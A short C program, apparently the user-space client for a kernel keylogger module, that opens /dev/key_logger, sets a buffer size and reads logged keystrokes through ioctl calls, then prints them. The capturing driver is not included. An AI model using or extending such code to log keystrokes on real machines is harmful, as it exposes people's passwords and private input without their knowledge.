#define USER_SPACE
#include "key_logger.h" 
 
#include <stdio.h> 
#include <fcntl.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <sys/ioctl.h> 
 

int main(void) 
{ 
    int fd = open("/dev/key_logger", O_RDWR);

    unsigned long size = 1000;
    char keybuffer[1000];
    ioctl(fd, SET_BUFF_SIZE, size);
    ioctl(fd, GET_READ_KEYS, keybuffer);

    printf("%s\n", keybuffer);
    close(fd); 
}